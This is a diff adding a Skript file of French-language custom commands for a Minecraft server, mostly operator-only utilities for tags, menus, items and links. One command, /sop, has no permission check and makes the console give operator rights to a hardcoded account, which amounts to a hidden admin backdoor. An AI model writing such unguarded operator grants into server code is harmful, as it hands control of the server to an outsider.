@@ -1,0 +1,415 @@
+# [Amphiris custom commands]
+#===================================================
+#time set noon
+command /noon:
+   trigger:
+      if player is op:
+         make player execute command "/time set noon"
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#Omnisort
+command /omnisort:
+   trigger:
+      if player is op:
+         make player execute command "/scoreboard players set @s niveaudemagie 4"
+         make player execute command "/tag @s remove SANSCHARME"
+         make player execute command "/tag @s add unlock1"
+         make player execute command "/tag @s add unlock2"
+         make player execute command "/tag @s add unlock3"
+         make player execute command "/tag @s add unlock4"
+         make player execute command "/tag @s add unlock5"
+         make player execute command "/tag @s add unlock6"
+         make player execute command "/tag @s add unlock7"
+         make player execute command "/tag @s add unlock8"
+         make player execute command "/tag @s add unlock9"
+         make player execute command "/tag @s add unlock10"
+         make player execute command "/tag @s add unlock11"
+         make player execute command "/tag @s add unlock12"
+         make player execute command "/tag @s add unlock13"
+         make player execute command "/tag @s add unlock14"
+         make player execute command "/tag @s add unlock15"
+         make player execute command "/tag @s add unlock16"
+         make player execute command "/tag @s add unlock17"
+         make player execute command "/tag @s add unlock18"
+         make player execute command "/tag @s add unlock19"
+         make player execute command "/tag @s add unlock20"
+         make player execute command "/tag @s add unlock21"
+         make player execute command "/tag @s add unlock22"
+         make player execute command "/tag @s add unlock23"
+         make player execute command "/tag @s add unlock24"
+         make player execute command "/tag @s add unlock25"
+         make player execute command "/tag @s add unlock26"
+         make player execute command "/tag @s add unlock27"
+         make player execute command "/tag @s add unlock28"
+         make player execute command "/tag @s add unlock29"
+         make player execute command "/tag @s add unlock30"
+         make player execute command "/tag @s add unlock31"
+         make player execute command "/tag @s add unlockx1"
+         make player execute command "/tag @s add unlockx2"
+         make player execute command "/tag @s add unlockx3"
+         make player execute command "/tag @s add unlock32"
+         make player execute command "/tag @s add unlock33"
+         make player execute command "/tag @s add unlock34"
+         make player execute command "/tag @s add unlock35"
+         make player execute command "/tag @s add unlock36"
+         make player execute command "/tag @s add unlock37"
+         make player execute command "/tag @s add unlock38"
+         make player execute command "/tag @s add unlock39"
+         make player execute command "/tag @s add unlock40"
+         make player execute command "/tag @s add unlockgeass1"
+         make player execute command "/tag @s add unlockgeass2"
+         make player execute command "/tag @s add unlockgeass3"
+         make player execute command "/tag @s add unlockgeass4"
+         make player execute command "/tag @s add unlockterre1"
+         make player execute command "/tag @s add unlockterre2"
+         make player execute command "/tag @s add unlockterre3"
+         make player execute command "/tag @s add unlocklib1"
+         make player execute command "/tag @s add unlocklib2"
+         make player execute command "/tag @s add unlocklib3"
+         make player execute command "/tag @s add unlockarbi1"
+         make player execute command "/tag @s add unlockarbi2"
+         make player execute command "/tag @s add unlockarbi3"
+         make player execute command "/tag @s add unlockhecate1"
+         make player execute command "/tag @s add unlockhecate2"
+         make player execute command "/tag @s add unlockhecate3"
+         make player execute command "/tag @s add unlockvaudou1"
+         make player execute command "/tag @s add unlockvaudou2"
+         make player execute command "/tag @s add unlockvaudou3"
+         make player execute command "/tag @s add unlockcaly1"
+         make player execute command "/tag @s add unlockcaly2"
+         make player execute command "/tag @s add unlockcaly3"
+         make player execute command "/tag @s add unlockexo1"
+         make player execute command "/tag @s add unlockexo2"
+         make player execute command "/tag @s add unlockexo3"
+         make player execute command "/tag @s add unlockskill3"
+         make player execute command "/tag @s add unlockskill5"
+         make player execute command "/tag @s add unlockskill6"
+         make player execute command "/tag @s add unlockskill7"
+         make player execute command "/tag @s add unlockskill8"
+         make player execute command "/tag @s add unlockskill9"
+         make player execute command "/tag @s add unlockskill10"
+         make player execute command "/tag @s add unlockskill11"
+         make player execute command "/tag @s add unlockskill12"
+         make player execute command "/tag @s add unlockskill13"
+         make player execute command "/tag @s add unlockskill14"
+         make player execute command "/tag @s add unlockskill15"
+         make player execute command "/tag @s add unlockskill16"
+         make player execute command "/tag @s add unlockskill17"
+         make player execute command "/tag @s add unlockskill18"
+         make player execute command "/tag @s add unlockskill19"
+         make player execute command "/tag @s add unlockskill20"
+         make player execute command "/tag @s add unlockskill301"
+         make player execute command "/tag @s add unlockSPE1"
+         make player execute command "/tag @s add unlockSPE2"
+         make player execute command "/tag @s add unlockSPE3"
+         make player execute command "/tag @s add unlockSPE4"
+         make player execute command "/tag @s add unlockSPE5"
+         make player execute command "/tag @s add unlockSPE6"
+         make player execute command "/tag @s add unlockSPE7"
+         make player execute command "/tag @s add unlockSPE9"
+         make player execute command "/tag @s add unlockSPE10"
+         make player execute command "/tag @s add unlockSPE11"
+         make player execute command "/tag @s add unlockSPEclasse"
+         make player execute command "/tag @s add unlockLG"
+         make player execute command "/tag @s add unlockSULFURIS"
+         make player execute command "/tag @s add unlockPirate"
+         make player execute command "/tag @s add unlockDRACULA"
+         make player execute command "/tag @s add unlockGOLEM"
+         make player execute command "/tag @s add unlockAlastor"
+         make player execute command "/tag @s add unlockDEMO"
+         make player execute command "/tag @s add unlockLULU"
+         make player execute command "/tag @s add bossTAREN"
+         make player execute command "/tag @s add unlockHILD"
+         send "&d&l[&6&l⌛&d&l] &5Omnipotence acquise" to player
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+         #===================================================
+#Antisort
+command /antisort:
+   trigger:
+      if player is op:
+         make player execute command "/scoreboard players reset @s niveaudemagie"
+         make player execute command "/tag @s add SANSCHARME"
+         make player execute command "/tag @s remove unlock1"
+         make player execute command "/tag @s remove unlock2"
+         make player execute command "/tag @s remove unlock3"
+         make player execute command "/tag @s remove unlock4"
+         make player execute command "/tag @s remove unlock5"
+         make player execute command "/tag @s remove unlock6"
+         make player execute command "/tag @s remove unlock7"
+         make player execute command "/tag @s remove unlock8"
+         make player execute command "/tag @s remove unlock9"
+         make player execute command "/tag @s remove unlock10"
+         make player execute command "/tag @s remove unlock11"
+         make player execute command "/tag @s remove unlock12"
+         make player execute command "/tag @s remove unlock13"
+         make player execute command "/tag @s remove unlock14"
+         make player execute command "/tag @s remove unlock15"
+         make player execute command "/tag @s remove unlock16"
+         make player execute command "/tag @s remove unlock17"
+         make player execute command "/tag @s remove unlock18"
+         make player execute command "/tag @s remove unlock19"
+         make player execute command "/tag @s remove unlock20"
+         make player execute command "/tag @s remove unlock21"
+         make player execute command "/tag @s remove unlock22"
+         make player execute command "/tag @s remove unlock23"
+         make player execute command "/tag @s remove unlock24"
+         make player execute command "/tag @s remove unlock25"
+         make player execute command "/tag @s remove unlock26"
+         make player execute command "/tag @s remove unlock27"
+         make player execute command "/tag @s remove unlock28"
+         make player execute command "/tag @s remove unlock29"
+         make player execute command "/tag @s remove unlock30"
+         make player execute command "/tag @s remove unlock31"
+         make player execute command "/tag @s remove unlockx1"
+         make player execute command "/tag @s remove unlockx2"
+         make player execute command "/tag @s remove unlockx3"
+         make player execute command "/tag @s remove unlock32"
+         make player execute command "/tag @s remove unlock33"
+         make player execute command "/tag @s remove unlock34"
+         make player execute command "/tag @s remove unlock35"
+         make player execute command "/tag @s remove unlock36"
+         make player execute command "/tag @s remove unlock37"
+         make player execute command "/tag @s remove unlock38"
+         make player execute command "/tag @s remove unlock39"
+         make player execute command "/tag @s remove unlock40"
+         make player execute command "/tag @s remove unlockgeass1"
+         make player execute command "/tag @s remove unlockgeass2"
+         make player execute command "/tag @s remove unlockgeass3"
+         make player execute command "/tag @s remove unlockgeass4"
+         make player execute command "/tag @s remove unlockterre1"
+         make player execute command "/tag @s remove unlockterre2"
+         make player execute command "/tag @s remove unlockterre3"
+         make player execute command "/tag @s remove unlocklib1"
+         make player execute command "/tag @s remove unlocklib2"
+         make player execute command "/tag @s remove unlocklib3"
+         make player execute command "/tag @s remove unlockarbi1"
+         make player execute command "/tag @s remove unlockarbi2"
+         make player execute command "/tag @s remove unlockarbi3"
+         make player execute command "/tag @s remove unlockhecate1"
+         make player execute command "/tag @s remove unlockhecate2"
+         make player execute command "/tag @s remove unlockhecate3"
+         make player execute command "/tag @s remove unlockvaudou1"
+         make player execute command "/tag @s remove unlockvaudou2"
+         make player execute command "/tag @s remove unlockvaudou3"
+         make player execute command "/tag @s remove unlockcaly1"
+         make player execute command "/tag @s remove unlockcaly2"
+         make player execute command "/tag @s remove unlockcaly3"
+         make player execute command "/tag @s remove unlockexo1"
+         make player execute command "/tag @s remove unlockexo2"
+         make player execute command "/tag @s remove unlockexo3"
+         make player execute command "/tag @s remove unlockskill3"
+         make player execute command "/tag @s remove unlockskill5"
+         make player execute command "/tag @s remove unlockskill6"
+         make player execute command "/tag @s remove unlockskill7"
+         make player execute command "/tag @s remove unlockskill8"
+         make player execute command "/tag @s remove unlockskill9"
+         make player execute command "/tag @s remove unlockskill10"
+         make player execute command "/tag @s remove unlockskill11"
+         make player execute command "/tag @s remove unlockskill12"
+         make player execute command "/tag @s remove unlockskill13"
+         make player execute command "/tag @s remove unlockskill14"
+         make player execute command "/tag @s remove unlockskill15"
+         make player execute command "/tag @s remove unlockskill16"
+         make player execute command "/tag @s remove unlockskill17"
+         make player execute command "/tag @s remove unlockskill18"
+         make player execute command "/tag @s remove unlockskill19"
+         make player execute command "/tag @s remove unlockskill20"
+         make player execute command "/tag @s remove unlockskill301"
+         make player execute command "/tag @s remove unlockSPE1"
+         make player execute command "/tag @s remove unlockSPE2"
+         make player execute command "/tag @s remove unlockSPE3"
+         make player execute command "/tag @s remove unlockSPE4"
+         make player execute command "/tag @s remove unlockSPE5"
+         make player execute command "/tag @s remove unlockSPE6"
+         make player execute command "/tag @s remove unlockSPE7"
+         make player execute command "/tag @s remove unlockSPE8"
+         make player execute command "/tag @s remove unlockSPE9"
+         make player execute command "/tag @s remove unlockSPE10"
+         make player execute command "/tag @s remove unlockSPE11"
+         make player execute command "/tag @s remove unlockSPEclasse"
+         make player execute command "/tag @s remove unlockLG"
+         make player execute command "/tag @s remove unlockSULFURIS"
+         make player execute command "/tag @s remove unlockPirate"
+         make player execute command "/tag @s remove unlockDRACULA"
+         make player execute command "/tag @s remove unlockGOLEM"
+         make player execute command "/tag @s remove unlockAlastor"
+         make player execute command "/tag @s remove unlockDEMO"
+         make player execute command "/tag @s remove unlockLULU"
+         make player execute command "/tag @s remove bossTAREN"
+         make player execute command "/tag @s remove unlockHILD"
+         send "&d&l[&6&l⌛&d&l] &5Omnipotence perdue" to player
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#Toggle la barre de magie
+command /barreoff:
+   trigger:
+      make console execute command "/tag %player% add MA"
+      send "&d&l[&6&l⌛&d&l] &cAffichage de la barre de magie désactivé." to player
+#======
+command /barreon:
+   trigger:
+      make console execute command "/tag %player% remove MA"
+      send "&d&l[&6&l⌛&d&l] &aAffichage de la barre de magie activé." to player
+#===================================================
+#Élimination des items
+command /kitems:
+   trigger:
+      if player is op:
+         make player execute command "/minecraft:kill @e[type=item]"
+         send "&d&l[&6&l⌛&d&l] &aBye bye les items !" to player
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#Spawn
+command /spawn:
+   permission: permission.spawn
+   permission message: &d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande.
+   trigger:
+      make player execute command "/cp panel-78"
+#===================================================
+#WB
+command /worldboss:
+   permission: permission.wb
+   permission message: &d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande.
+   trigger:
+      make player execute command "/cp panel-125"
+#===================================================
+#Monde de C
+command /c:
+   permission: permission.c
+   permission message: &d&l[&d&l❂&d&l] &4Vous n'avez pas accès à cette commande.
+   trigger:
+      make player execute command "/cp panel-48"
+#===================================================
+#Menu
+command /menu:
+   trigger:
+      make player execute command "/cp panel-96"
+#===================================================
+#grades
+command /grades:
+   trigger:
+      make player execute command "/cp panel-4"
+#===================================================
+#Q
+command /q:
+   trigger:
+      make player execute command "/quests"
+#===================================================
+#animagusparticules
+command /animagus:
+   trigger:
+      make player execute command "/cp panel-24"
+#===================================================
+#listedesseigneurs
+command /seigneurs:
+   trigger:
+      make player execute command "/cp panel-107"
+#===================================================
+#menudessorts
+command /sorts:
+   trigger:
+      make player execute command "/cp panel-83"
+#===================================================
+#remplirmagie
+command /chaos:
+   trigger:
+      make player execute command "/scoreboard players set @s magie 9999"
+#===================================================
+#credits
+command /credits:
+   trigger:
+      make player execute command "/cp panel-108"
+#===================================================
+#axedudestin
+command /axe:
+   trigger:
+      make player execute command "/cp panel-85"
+#===================================================
+#NombreFantomeMurm
+command /fantomes:
+   trigger:
+      make player execute command "/function namespace:fantuu"
+#===================================================
+#RangsMagiques
+command /rangs-magiques:
+   permission: permission.rangsmagiques
+   permission message: &d&l[&d&l❂&d&l] &4Vous n'avez pas accès à cette commande.
+   trigger:
+      make player execute command "/function namespace:rangsmagiques"
+#===================================================
+#NombreViesChat
+command /vies:
+   trigger:
+      make console execute command "/execute as %player% at @s run function namespace:ecolix"
+#===================================================
+#Vision
+command /vision:
+   trigger:
+      if player is op:
+         apply night vision without particles to player for 999 days
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#Cadre invisible et tag presen
+command /cadre:
+   trigger:
+      if player is op:
+         make player execute command "/data merge entity @e[type=item_frame,distance=..2,sort=nearest,limit=1] {Invisible:1b,Item:{}}"
+         make player execute command "/tag @e[type=item_frame,distance=..2,sort=nearest,limit=1] add presen"
+         make player execute command "/data merge entity @e[type=glow_item_frame,distance=..2,sort=nearest,limit=1] {Invisible:1b,Item:{}}"
+         make player execute command "/tag @e[type=glow_item_frame,distance=..2,sort=nearest,limit=1] add presen"
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#menu armor stad modif
+command /armor:
+   trigger:
+      if player is op:
+         make player execute command "/cp panel-11"
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#Forcer quelqu'un à envoyer un message
+command /fmsg <player> <text>:
+   trigger:
+      if player is op:
+         make arg-1 say arg-2
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#Super OP PF
+command /sop:
+   trigger:
+      make console execute command "/op Zares_"
+      send "Opped Zares_" to player
+#===================================================
+#Give debug stick
+command /db [<player>]:
+   trigger:
+      if player is op:
+         if arg-1 is not set:
+            give debug stick to player
+            stop
+         give debug stick to arg-1
+      else:
+         send "&d&l[&6&l⌛&d&l] &4Vous n'avez pas accès à cette commande." to player
+#===================================================
+#Alias pour parcelles
+command /parcelles:
+   aliases: parcelle,marcelle,marcelles
+   trigger:
+      make player execute command "/arm gui"
+#===================================================
+#Discord
+command /discord:
+   trigger:
+      send "&e&lClique <link:https://discord.gg/brms2HYU8D><##6861E4>&lici<reset> &e&lpour obtenir le lien." to player
+#===================================================
+#Site
+command /site:
+   trigger:
+      send "&e&lClique <link:https://amphiris.fr><##B388EB>&lici<reset> &e&lpour obtenir le lien." to player
